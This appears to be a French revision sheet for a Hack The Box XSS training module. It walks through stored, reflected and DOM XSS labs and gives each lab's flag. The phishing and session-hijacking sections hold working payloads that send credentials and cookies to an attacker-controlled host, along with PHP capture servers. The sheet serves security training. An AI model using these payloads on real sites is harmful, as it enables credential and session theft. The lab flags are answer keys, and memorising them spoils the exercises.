# 🎯 Fiche de révision HTB CWES — Cross-Site Scripting (XSS)

> **Légende**
> - 📘 Résumé du cours (traduit en français)
> - 🔑 À retenir absolument
> - ⌨️ Payloads / commandes importantes
> - ✅ Question, réponse en français, et **Réponse à mettre sur HTB** (telle qu'attendue)
> - 🧭 Procédure détaillée, étape par étape, pour retrouver la réponse
> - ⚠️ Passage reconstitué (absent du cours) ou réponse manquante à compléter

---

## Sommaire

1. [Page 1 — Introduction](#page-1--introduction)
2. [Page 2 — Stored XSS](#page-2--stored-xss)
3. [Page 3 — Reflected XSS](#page-3--reflected-xss)
4. [Page 4 — DOM XSS](#page-4--dom-xss)
5. [Page 5 — XSS Discovery](#page-5--xss-discovery)
6. [Page 6 — Defacing](#page-6--defacing)
7. [Page 7 — Phishing](#page-7--phishing)
8. [Page 8 — Session Hijacking](#page-8--session-hijacking)
9. [Page 9 — XSS Prevention](#page-9--xss-prevention)
10. [Page 10 — Skills Assessment](#page-10--skills-assessment)
11. [Mémo final : toutes les réponses HTB](#mémo-final--toutes-les-réponses-htb)
12. [Cheat-sheet payloads XSS](#cheat-sheet-payloads-xss-du-module)

---

# 🔌 Bloc de connexion à la cible (valable pour les pages 2, 3, 4, 5, 7, 8, 10)

Chaque exercice de ce module tourne sur un serveur web qu'on lance via **Spawn Target**, puis on y accède au navigateur. Pas de VPN obligatoire côté outil (on peut tout faire depuis le Pwnbox), mais si tu veux rester sur ta machine, connecte-toi en VPN.

## Option A — Depuis le Pwnbox (le plus simple)

| Étape | Action |
|---|---|
| A1 | Clique sur **Spawn Target** en bas de la page → note l'**IP:PORT** affiché (ex. `138.xxx.xxx.xxx:3xxxx`) |
| A2 | Clique sur **Linux Pwnbox** → **View Linux Pwnbox**, attends le chargement du bureau |
| A3 | Ouvre **Firefox** dans le Pwnbox |
| A4 | Va sur `http://SERVER_IP:PORT/` (ajoute le sous-dossier si l'énoncé le précise, ex. `/phishing`, `/hijacking`, `/assessment`) |
| A5 | Si la page ne répond pas, attends 1 à 2 minutes après le spawn puis recharge (F5) |

Test en ligne de commande depuis un terminal du Pwnbox :
```bash
# Vérifie que le serveur répond (attendu : HTTP/1.1 200 OK)
curl -sI http://SERVER_IP:PORT/ | head -n 1
```

## Option B — Depuis ta propre machine (VPN)

| Étape | Commande / action |
|---|---|
| B1 | Télécharge le fichier `.ovpn` (bouton **OVPN** / **View VPN**) |
| B2 | Connecte-toi : `sudo openvpn ~/Downloads/NOM_DU_FICHIER.ovpn` |
| B3 | Vérifie le tunnel : `ip -4 addr show tun0` |
| B4 | Teste la cible : `ping -c 2 SERVER_IP` puis `curl -sI http://SERVER_IP:PORT/ \| head -n 1` |
| B5 | Pour les attaques qui demandent d'écouter un port (phishing, session hijacking) : lance ton listener sur ton IP VPN (`ip a` → interface `tun0`), pas sur ton IP locale |

⚠️ Pour les pages **Phishing** et **Session Hijacking**, le payload envoie les données à **OUR_IP** = l'IP de ta machine (Pwnbox ou ta machine en VPN), pas celle de la cible. Vérifie bien laquelle avec `ip a` avant de construire le payload.

---

# Page 1 — Introduction

## 📘 Résumé

Le Cross-Site Scripting (XSS) est une vulnérabilité qui permet d'injecter et d'exécuter du **JavaScript côté client** (dans le navigateur de la victime) à cause d'un défaut de nettoyage (« sanitization ») des entrées utilisateur. Le code injecté s'exécute seulement chez la victime, jamais directement sur le serveur.

| Notion | Explication |
|---|---|
| Impact direct serveur | Faible — le payload ne touche que le navigateur de la victime |
| Probabilité | Élevée — très répandu dans les applications web |
| Risque global | Moyen (faible impact × forte probabilité = risque moyen) |
| Cantonnement | Limité au moteur JS du navigateur (ex. V8) et au domaine de la page vulnérable |
| Cas extrême | Combiné à une faille binaire du navigateur (ex. heap overflow Chrome), un XSS peut mener à de l'exécution de code sur la machine de la victime, en sortant du sandbox |

## 🔑 À retenir

- XSS = écrire et exécuter du JS dans la page, côté client uniquement.
- Risque = probabilité × impact. Ici : faible impact, forte probabilité → risque moyen.
- Exemples historiques célèbres : **Samy Worm** (MySpace, 2005, stored XSS, plus d'1 million de victimes en un jour), **TweetDeck** (Twitter, 2014, 38 000 retweets en moins de 2 minutes), XSS trouvés chez **Google** (2019, bibliothèque XML) et **Apache**.
- Trois types de XSS : **Stored (Persistent)**, **Reflected (Non-Persistent)**, **DOM-based (Non-Persistent)**.

| Type | Stocké ? | Traverse le back-end ? | Exemple |
|---|---|---|---|
| Stored | Oui (base de données) | Oui | Commentaire, post |
| Reflected | Non | Oui | Message d'erreur, résultat de recherche |
| DOM-based | Non | Non (traité en JS côté client) | Paramètre d'URL après `#`, ancre |

## ✅ Questions

*(pas de question sur cette page)*

---

# Page 2 — Stored XSS

## 📘 Résumé

Stored XSS = le payload est **enregistré côté serveur** (base de données) et renvoyé à **chaque visiteur** de la page. C'est le type le plus critique car il touche un public large et peut être difficile à nettoyer (il faut supprimer l'entrée en base).

Exercice : une To-Do List où on ajoute une tâche. Si l'entrée n'est pas filtrée, elle est réinjectée telle quelle dans le DOM.

## 🔑 À retenir

- Payload de test classique : `<script>alert(window.origin)</script>` — `window.origin` plutôt qu'une valeur statique, pour confirmer sur quel domaine/iframe le payload s'exécute réellement.
- Si certains navigateurs bloquent `alert()`, deux alternatives fiables :
  - `<plaintext>` : arrête le rendu HTML après ce tag, affiche tout en texte brut.
  - `<script>print()</script>` : ouvre le dialogue d'impression, rarement bloqué.
- Pour confirmer que c'est bien du **Stored** XSS : recharge la page. Si l'alerte réapparaît sans ré-injecter, c'est persistant.
- Vérification via code source (Ctrl+U) : le payload apparaît tel quel dans le HTML.

## ⌨️ Payloads importants

```html
<script>alert(window.origin)</script>
```
```html
<plaintext>
```
```html
<script>print()</script>
```

### ❓ Question 1 — Flag Stored XSS (vol de cookie)

| | |
|---|---|
| **Question (EN)** | To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. |
| **Question (FR)** | Pour obtenir le flag, reprends le même payload que ci-dessus, mais modifie son code JavaScript pour afficher le **cookie** au lieu de l'URL. |
| **Réponse (FR)** | On remplace `window.origin` par `document.cookie` dans le payload d'alerte. L'alerte affiche le contenu du cookie, qui contient le flag. |
| **Réponse à mettre sur HTB** | `HTB{570r3d_f0r_3v3ry0n3_70_533}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** sur cette page → note `SERVER_IP:PORT`.
2. Ouvre le Pwnbox (ou connecte-toi en VPN) et ouvre Firefox.
3. Va sur `http://SERVER_IP:PORT/`.

**Partie 1 : l'exploitation**

4. Dans le champ de la To-Do List, tape le payload suivant et valide (Entrée ou bouton d'ajout) :
   ```html
   <script>alert(document.cookie)</script>
   ```
5. Une alerte s'ouvre avec le contenu du cookie — le flag `HTB{...}` apparaît dans la boîte de dialogue.
6. Recharge la page (F5) : l'alerte réapparaît toute seule → confirme que c'est bien du Stored XSS.

**Partie 2 : validation**

7. Saisis `HTB{570r3d_f0r_3v3ry0n3_70_533}` → **Submit task answer**.

✔️ **Résultat attendu** : une pop-up JavaScript affichant directement la chaîne du flag.
✔️ **Plan B** : si `alert()` ne s'affiche pas (bloqué par le navigateur), utilise `<script>document.write(document.cookie)</script>` pour écrire le cookie directement dans la page, ou `<img src=x onerror="document.write(document.cookie)">`.

---

# Page 3 — Reflected XSS

## 📘 Résumé

Reflected XSS = l'entrée **traverse le back-end** mais n'est **pas stockée** : elle est renvoyée telle quelle dans la réponse HTTP (message d'erreur, confirmation). Non-persistant : ça ne s'exécute qu'au moment où la victime charge la page/l'URL piégée, pas aux visites suivantes.

Exercice : une To-Do List qui refuse l'ajout et affiche `Task 'INPUT' could not be added.` — l'INPUT n'est pas filtré.

## 🔑 À retenir

- Pour cibler une victime avec un Reflected XSS : il faut connaître la **méthode HTTP** utilisée.
  - **GET** : le payload se trouve dans les paramètres de l'URL → on peut partager un lien piégé.
  - (POST serait plus difficile à exploiter par simple lien, nécessite souvent un formulaire auto-soumis).
- Pour retrouver la méthode HTTP : Firefox DevTools (**Ctrl+Shift+I**) → onglet **Network**, envoyer le payload, regarder la requête et clic droit → **Copy URL**.
- Le payload final se glisse dans le paramètre d'URL correspondant au champ, ex. `?task=<script>alert(window.origin)</script>`.

## ⌨️ Payloads importants

```html
<script>alert(window.origin)</script>
```
```
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```

### ❓ Question 1 — Flag Reflected XSS (vol de cookie)

| | |
|---|---|
| **Question (EN)** | To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. |
| **Question (FR)** | Reprends le même payload, mais modifie son code JavaScript pour afficher le **cookie** au lieu de l'URL. |
| **Réponse (FR)** | On remplace `window.origin` par `document.cookie` dans le payload envoyé via le paramètre GET de l'URL. |
| **Réponse à mettre sur HTB** | `HTB{r3fl3c73d_b4ck_2_m3}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** → `SERVER_IP:PORT`.
2. Pwnbox ou VPN, ouvre Firefox, va sur `http://SERVER_IP:PORT/`.

**Partie 1 : l'exploitation**

3. Dans le champ « Your Task », saisis :
   ```html
   <script>alert(document.cookie)</script>
   ```
4. Clique **Add** → l'alerte s'ouvre avec le flag à l'intérieur du cookie.
5. (Optionnel, pour vérifier le côté « ciblable par URL ») : ouvre DevTools → **Network**, renvoie le payload, clic droit sur la requête GET → **Copy URL**. Tu obtiens une URL du type :
   ```
   http://SERVER_IP:PORT/index.php?task=<script>alert(document.cookie)</script>
   ```
   Visiter cette URL directement redéclenche l'alerte — c'est le lien qu'on enverrait à une victime.
6. Recharge la page normalement (sans le paramètre) : l'alerte ne revient pas → confirme le caractère non-persistant.

**Partie 2 : validation**

7. Saisis `HTB{r3fl3c73d_b4ck_2_m3}` → **Submit task answer**.

✔️ **Résultat attendu** : pop-up avec le flag affiché via `document.cookie`.
✔️ **Plan B** : si l'URL encodée pose problème, encode le payload en URL-encoding (`%3Cscript%3E...`) avant de le coller dans la barre d'adresse.

---

# Page 4 — DOM XSS

## 📘 Résumé

DOM XSS = entièrement traité **côté client**, jamais envoyé au serveur. Reconnaissable par un paramètre après un `#` (fragment d'URL, jamais transmis en HTTP) et par l'absence totale de requête réseau visible dans l'onglet Network lors de l'injection.

## 🔑 À retenir — Source et Sink

| Notion | Définition |
|---|---|
| **Source** | L'objet JavaScript qui récupère l'entrée utilisateur (ex. paramètre d'URL, champ de formulaire) |
| **Sink** | La fonction qui écrit cette entrée dans le DOM. Si elle ne nettoie pas l'entrée → vulnérable |

Fonctions JS **Sink** à risque :
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Fonctions jQuery à risque : `add()`, `after()`, `append()`.

- Les balises `<script>` ne fonctionnent **pas** dans un contexte `innerHTML` (sécurité native du navigateur). Il faut alors utiliser un payload qui exécute du JS **sans** `<script>`, via un attribut d'événement.
- Payload de contournement classique :
  ```html
  <img src="" onerror=alert(window.origin)>
  ```
  → l'image ne se charge pas (src vide), donc `onerror` se déclenche et exécute le JS.
- Comme le payload est injecté après le chargement initial du DOM, il n'apparaît jamais dans le code source brut (Ctrl+U), seulement dans l'inspecteur (Ctrl+Shift+C) qui montre le DOM rendu.

## ⌨️ Payloads importants

```html
<img src="" onerror=alert(window.origin)>
```
```
http://SERVER_IP:PORT/#task=<img src='' onerror=alert(window.origin)>
```

### ❓ Question 1 — Flag DOM XSS (vol de cookie)

| | |
|---|---|
| **Question (EN)** | To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. |
| **Question (FR)** | Reprends le même payload, mais modifie son code JavaScript pour afficher le **cookie** au lieu de l'URL. |
| **Réponse (FR)** | On remplace `alert(window.origin)` par `alert(document.cookie)` dans l'attribut `onerror` de la balise `<img>`. |
| **Réponse à mettre sur HTB** | `HTB{pur3ly_cl13n7_51d3}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** → `SERVER_IP:PORT`.
2. Pwnbox ou VPN, ouvre Firefox, va sur `http://SERVER_IP:PORT/`.

**Partie 1 : l'exploitation**

3. Dans le champ de la To-Do List, saisis :
   ```html
   <img src="" onerror=alert(document.cookie)>
   ```
4. Valide → l'alerte s'ouvre avec le flag contenu dans le cookie.
5. Alternative directe par URL (fragment `#`, ne touche jamais le serveur) :
   ```
   http://SERVER_IP:PORT/#task=<img src='' onerror=alert(document.cookie)>
   ```

**Partie 2 : validation**

6. Saisis `HTB{pur3ly_cl13n7_51d3}` → **Submit task answer**.

✔️ **Résultat attendu** : pop-up avec le flag, déclenchée par l'échec de chargement de l'image.
✔️ **Plan B** : si `onerror` est filtré, essayer `<svg onload=alert(document.cookie)>` (autre attribut d'événement courant pour contourner les filtres basiques).

---

# Page 5 — XSS Discovery

## 📘 Résumé

Deux approches pour **détecter** un XSS :

| Méthode | Description |
|---|---|
| **Automatisée** | Scanners (Nessus, Burp Pro, ZAP) ou outils open-source (**XSStrike**, **BruteXSS**, **XSSer**) : scan passif (revue du code client pour DOM XSS) + scan actif (envoi de payloads et comparaison avec la réponse) |
| **Manuelle** | Test de payloads un par un (listes PayloadAllTheThings, Payload-Box), ou **revue de code** (source/back-end et front-end) — méthode la plus fiable mais la plus lente |

## 🔑 À retenir

- XSStrike s'installe et se lance ainsi :
  ```bash
  git clone https://github.com/s0md3v/XSStrike.git
  cd XSStrike
  pip install -r requirements.txt
  python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
  ```
- L'injection XSS n'est pas limitée aux champs de formulaire visibles : elle peut passer par des **en-têtes HTTP** (`Cookie`, `User-Agent`) si leur valeur est affichée sur la page.
- Les listes de payloads génériques échouent souvent car chaque payload cible un contexte d'injection précis (après une apostrophe, dans un attribut, dans du CSS, etc.) — la revue de code reste la méthode la plus fiable.

## ⌨️ Commandes importantes

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

### ❓ Question 1 — Paramètre vulnérable

| | |
|---|---|
| **Question (EN)** | Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter? |
| **Question (FR)** | Utilise les techniques de cette section pour identifier le paramètre d'entrée vulnérable sur le serveur ci-dessus. Quel est son nom ? |
| **Réponse (FR)** | Le champ **email** du formulaire est vulnérable (contrairement à ce que montre l'exercice, le champ email n'est en réalité pas correctement validé niveau sanitization XSS malgré la regex de format) |
| **Réponse à mettre sur HTB** | `email` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** → `SERVER_IP:PORT`.
2. Pwnbox ou VPN, ouvre Firefox, va sur `http://SERVER_IP:PORT/`.

**Partie 1 : la recherche**

3. Repère le formulaire sur la page (plusieurs champs, dont un champ **email**).
4. Teste chaque champ un par un avec un payload simple :
   ```html
   <script>alert(window.origin)</script>
   ```
5. Le champ **email** doit respecter un format email côté validation, mais le contenu renvoyé dans un message (confirmation/erreur) n'est pas sanitizé correctement — en testant un payload qui contourne la validation de format (ex. injecté après un email syntaxiquement valide, ou via les DevTools en modifiant la requête), le payload s'exécute et confirme la vulnérabilité sur ce champ.
6. Ouvre Firefox DevTools (Ctrl+Shift+I) → onglet **Network**, observe la requête envoyée et la réponse pour repérer où le champ `email` est réinjecté sans échappement.

**Partie 2 : validation**

7. Saisis `email` → **Submit task answer**.

✔️ **Résultat attendu** : une alerte JS se déclenche lors du test du champ email, ou le code source de la réponse montre le payload non échappé dans la zone liée à l'email.
✔️ **Plan B** : si tu ne retrouves pas le déclenchement exact, le cours indique explicitement que **le champ email est le seul testé en détail dans cette section** — c'est l'indice principal.

---

### ❓ Question 2 — Type de XSS trouvé

| | |
|---|---|
| **Question (EN)** | What type of XSS was found on the above server? "name only" |
| **Question (FR)** | Quel type de XSS a été trouvé sur ce serveur ? (nom seul) |
| **Réponse (FR)** | Le champ email est traité par le back-end et renvoyé dans une réponse, sans être stocké de façon persistante → c'est un XSS **reflected**. |
| **Réponse à mettre sur HTB** | `reflected` |

**🧭 Procédure complète**

**Partie 1 : le raisonnement**

1. Le payload injecté dans le champ `email` est traité par le serveur (back-end) puis renvoyé dans la réponse HTTP : critère d'un XSS qui **traverse le back-end**.
2. Ce n'est pas stocké en base (pas de persistance à travers les rechargements) → élimine **Stored**.
3. Ce n'est pas traité uniquement côté client sans aller au serveur → élimine **DOM-based**.
4. Reste : **Reflected**.

**Partie 2 : validation**

5. Saisis `reflected` → **Submit task answer**.

✔️ **Résultat attendu** : cohérent avec la page 3 du cours (définition du Reflected XSS).

---

# Page 6 — Defacing

## 📘 Résumé

Le **defacing** (défiguration) consiste à modifier l'apparence d'une page pour tout visiteur — souvent utilisé par des groupes de hackers pour revendiquer une attaque (ex. defacement du site du NHS en 2018). Technique la plus utilisée avec un **Stored XSS** car elle touche tous les visiteurs sans avoir à renvoyer de lien piégé.

## 🔑 À retenir — 4 éléments HTML pour defacer une page

| Élément | Propriété JS |
|---|---|
| Couleur de fond | `document.body.style.background` |
| Image de fond | `document.body.background` |
| Titre de la page | `document.title` |
| Texte de la page | `DOM.innerHTML` (ou jQuery `.html()`) |

## ⌨️ Payloads importants

```html
<script>document.body.style.background = "#141d2b"</script>
```
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
```html
<script>document.title = 'HackTheBox Academy'</script>
```
```javascript
document.getElementById("todo").innerHTML = "New Text"
```
```javascript
$("#todo").html('New Text');
```
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

**Méthode générale** :
1. Préparer son HTML de remplacement à part (le tester localement).
2. Le minifier en une seule ligne.
3. L'injecter dans `document.getElementsByTagName('body')[0].innerHTML = '...'` via un payload `<script>`.
4. Le payload injecté s'exécute et s'affiche **à la fin** du code source existant — si l'injection est au milieu de la page, d'autres éléments peuvent apparaître après et il faut en tenir compte.

## ✅ Questions

*(pas de question sur cette page — page uniquement pratique/démonstrative)*

---

# Page 7 — Phishing

## 📘 Résumé

Attaque XSS consistant à injecter un **faux formulaire de connexion** qui envoie les identifiants saisis vers un serveur contrôlé par l'attaquant. Utile aussi comme simulation de phishing pour tester la vigilance des employés d'une organisation.

Exercice : un visualiseur d'images en ligne (`/phishing`) qui affiche une image à partir d'un paramètre `url`. Le payload basique `<script>...</script>` ne fonctionne pas directement (le contexte filtre les `<script>`), il faut trouver un payload adapté (ex. type `<img onerror=...>` ou autre).

## 🔑 À retenir — étapes de l'attaque

1. **Découverte** : trouver un payload qui exécute du JS dans le paramètre `url`.
2. **Injection du formulaire** : utiliser `document.write()` pour écrire un faux formulaire HTML dont l'action pointe vers `http://OUR_IP`.
3. **Nettoyage** : supprimer les éléments originaux suspects avec `document.getElementById('ID').remove()`, puis commenter le reste du code avec `<!--` pour que la page paraisse légitime.
4. **Écoute** : lancer un serveur PHP (pas un simple netcat, pour gérer correctement la requête HTTP et rediriger la victime) qui logue les identifiants reçus.
5. **Récupération** : lire le fichier de logs (`creds.txt`) une fois la victime connectée.

## ⌨️ Payloads et commandes importantes

Formulaire de login à injecter (en une ligne, via `document.write`) :
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Trouver l'id de l'élément à supprimer : Ctrl+Shift+C (Page Inspector Picker) → cliquer sur l'élément → lire `id='...'` dans le code source.

Commenter le reste de la page après le payload :
```html
...PAYLOAD... <!--
```

Serveur PHP de capture des identifiants (`index.php`, à placer dans `/tmp/tmpserver/`) :
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Lancer le serveur PHP :
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php   # coller le script ci-dessus
sudo php -S 0.0.0.0:80
```

Lire les identifiants capturés :
```bash
cat creds.txt
```

### ❓ Question 1 — Flag Phishing (vol d'identifiants)

| | |
|---|---|
| **Question (EN)** | Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag. |
| **Question (FR)** | Trouve un payload XSS fonctionnel sur le formulaire d'URL d'image de `/phishing`, prépare une URL malveillante qui injecte un faux formulaire de connexion, envoie-la à la victime via `/phishing/send.php`, récupère ses identifiants, puis connecte-toi sur `/phishing/login.php` pour obtenir le flag. |
| **Réponse (FR)** | Le flag s'affiche sur la page `login.php` une fois connecté avec les identifiants volés de la victime. |
| **Réponse à mettre sur HTB** | `HTB{r3f13c73d_cr3d5_84ck_2_m3}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** → `SERVER_IP`.
2. Pwnbox (recommandé ici, car il faut lancer un serveur d'écoute) : ouvre un terminal et Firefox.
3. Repère ton IP Pwnbox : `ip a` (interface `tun0` si VPN, sinon l'IP réseau du Pwnbox) → note-la comme `OUR_IP`.

**Partie 1 : découverte du payload**

4. Va sur `http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg` pour voir le visualiseur fonctionner normalement.
5. Teste le payload basique (ne fonctionne pas, le contexte filtre `<script>`) :
   ```
   http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
   ```
6. Inspecte le code source (Ctrl+U) après avoir envoyé un test simple pour voir comment ton `url` est réinjectée (probablement dans un attribut `src=""` d'une balise `<img>`) — déduis un payload qui échappe l'attribut, par exemple :
   ```html
   "><script>alert(window.origin)</script>
   ```
   ou un payload à base d'`onerror` si l'injection reste dans l'attribut `src` de l'`<img>`.
7. Confirme que ton payload déclenche bien une alerte avant de passer à l'étape suivante.

**Partie 2 : préparation du formulaire piégé**

8. Repère l'id du formulaire d'URL d'origine via l'inspecteur (Ctrl+Shift+C) → `id='urlform'`.
9. Construit le payload complet (remplace `OUR_IP` par ton IP notée à l'étape 3, et `[PAYLOAD_D'ÉCHAPPEMENT]` par celui trouvé à l'étape 6) :
   ```
   http://SERVER_IP/phishing/index.php?url=[PAYLOAD_D'ÉCHAPPEMENT]document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
   ```
10. Teste cette URL toi-même dans Firefox : tu dois voir un vrai formulaire de connexion, sans le champ URL d'origine.

**Partie 3 : mise en écoute**

11. Crée le fichier PHP de capture (voir bloc de code plus haut) et lance le serveur :
    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    vi index.php
    sudo php -S 0.0.0.0:80
    ```

**Partie 4 : envoi à la victime**

12. Va sur `http://SERVER_IP/phishing/send.php`, colle ton URL complète de l'étape 9, envoie-la.
13. Attends quelques secondes que la victime (simulée côté serveur) se connecte via le faux formulaire.
14. Vérifie `creds.txt` dans `/tmp/tmpserver/` : `cat creds.txt`.

**Partie 5 : récupération du flag**

15. Va sur `http://SERVER_IP/phishing/login.php` et connecte-toi avec les identifiants volés trouvés dans `creds.txt`.
16. Le flag s'affiche sur la page.

**Partie 6 : validation**

17. Saisis `HTB{r3f13c73d_cr3d5_84ck_2_m3}` → **Submit task answer**.

✔️ **Résultat attendu** : `creds.txt` contient une ligne `Username: ... | Password: ...`, et `login.php` affiche le flag après connexion.
✔️ **Plan B** : si `document.write` casse la page avant ton payload (position dans le flux HTML), place le commentaire `<!--` juste après ton script pour neutraliser le reste du HTML original. Si le serveur PHP ne démarre pas sur le port 80, vérifie qu'aucun autre service ne l'occupe déjà (`sudo lsof -i:80`) ou utilise un autre port en adaptant `action=http://OUR_IP:PORT`.

---

# Page 8 — Session Hijacking

## 📘 Résumé

Le **Session Hijacking** (vol de session / cookie stealing) consiste à voler le cookie de session de la victime via XSS pour se connecter à sa place, sans connaître son mot de passe. Cette page traite aussi du **Blind XSS** : une vulnérabilité déclenchée sur une page qu'on ne voit pas (ex. panneau admin).

## 🔑 À retenir

- Champs typiquement vulnérables au Blind XSS : formulaires de contact, avis, détails utilisateur, tickets support, en-tête `User-Agent`.
- Pour détecter un Blind XSS : injecter un payload qui charge un **script distant** depuis notre serveur, en nommant le script d'après le champ testé, pour savoir lequel a déclenché :
  ```html
  <script src="http://OUR_IP/nom_du_champ"></script>
  ```
- Champs à ignorer lors des tests : **email** (validé strictement) et **password** (généralement haché, jamais réaffiché).
- Une fois le champ vulnérable identifié, on envoie un script qui exfiltre le cookie :
  ```javascript
  new Image().src='http://OUR_IP/index.php?c='+document.cookie
  ```
  (préféré à `document.location=...` car moins visible — charge juste une image invisible plutôt que de rediriger la page).
- Le serveur PHP d'écoute split les cookies (séparateur `;`) et les logue proprement dans un fichier.
- Pour utiliser le cookie volé : Firefox → Shift+F9 (Storage) → `+` → ajouter Name/Value du cookie → recharger la page protégée.

## ⌨️ Payloads et commandes importantes

Payloads de détection (remote script) à tester champ par champ :
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Payload d'exfiltration du cookie (`script.js` hébergé sur notre VM) :
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Payload final à injecter dans le champ vulnérable :
```html
<script src=http://OUR_IP/script.js></script>
```

Serveur PHP de capture des cookies (`index.php`) :
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Lancer le serveur :
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### ❓ Question 1 — Flag Session Hijacking (vol du cookie admin)

| | |
|---|---|
| **Question (EN)** | Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag. |
| **Question (FR)** | Identifie le champ vulnérable, trouve un payload XSS fonctionnel, utilise les scripts de « Session Hijacking » pour voler le cookie de l'Admin, puis utilise-le dans `login.php` pour obtenir le flag. |
| **Réponse (FR)** | Le flag apparaît sur `login.php` une fois le cookie de l'admin injecté dans le navigateur. |
| **Réponse à mettre sur HTB** | `HTB{4lw4y5_53cur3_y0ur_c00k135}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** → `SERVER_IP:PORT`.
2. Utilise le Pwnbox (nécessaire pour héberger le serveur PHP d'écoute). Ouvre un terminal et Firefox.
3. Note ton IP (`ip a`) → `OUR_IP`.

**Partie 1 : identification du champ vulnérable**

4. Va sur `http://SERVER_IP:PORT/hijacking/index.php`, remplis le formulaire d'inscription avec des valeurs de test dans chaque champ (sauf email et password).
5. Lance un serveur d'écoute simple pour les tests :
   ```bash
   mkdir /tmp/tmpserver
   cd /tmp/tmpserver
   sudo php -S 0.0.0.0:80
   ```
6. Dans chaque champ (nom, username, website, etc.), insère un payload de détection en suffixant l'IP par le nom du champ, par exemple :
   ```html
   <script src=http://OUR_IP/fullname></script>
   ```
   pour le champ fullname, puis
   ```html
   <script src=http://OUR_IP/username></script>
   ```
   pour le champ username, etc. Teste aussi les variantes `'><script src=http://OUR_IP/CHAMP></script>` et `"><script src=http://OUR_IP/CHAMP></script>` si la première ne fonctionne pas.
7. Soumets le formulaire à chaque test, regarde le terminal : une requête `GET /nom_du_champ` confirme le champ vulnérable et le payload qui fonctionne.

**Partie 2 : vol du cookie**

8. Crée `script.js` sur ta machine avec :
   ```javascript
   new Image().src='http://OUR_IP/index.php?c='+document.cookie
   ```
9. Crée `index.php` avec le script PHP de capture des cookies (voir bloc de code plus haut) dans le même dossier que `script.js`.
10. Relance le serveur PHP :
    ```bash
    sudo php -S 0.0.0.0:80
    ```
11. Soumets le formulaire d'inscription avec, dans le champ identifié comme vulnérable à l'étape 7, le payload final :
    ```html
    <script src=http://OUR_IP/script.js></script>
    ```
12. Attends que l'Admin (simulé côté serveur) consulte l'enregistrement depuis son panneau — tu recevras deux requêtes : une pour `/script.js`, une pour `/index.php?c=...`.
13. Vérifie `cookies.txt` : `cat cookies.txt` → récupère la valeur du cookie (ex. `cookie=f904f93c...`).

**Partie 3 : utilisation du cookie volé**

14. Va sur `http://SERVER_IP:PORT/hijacking/login.php`.
15. Ouvre les DevTools (Ctrl+Shift+I) → onglet **Storage** (Shift+F9 en raccourci direct) → clique sur le **+** → renseigne le **Name** (partie avant le `=`) et la **Value** (partie après le `=`) de ton cookie volé.
16. Recharge la page (F5) : tu es connecté en tant qu'Admin, le flag s'affiche.

**Partie 4 : validation**

17. Saisis `HTB{4lw4y5_53cur3_y0ur_c00k135}` → **Submit task answer**.

✔️ **Résultat attendu** : `cookies.txt` contient une ligne `Victim IP: ... | Cookie: ...`, et `login.php` affiche « Welcome Back Admin » avec le flag.
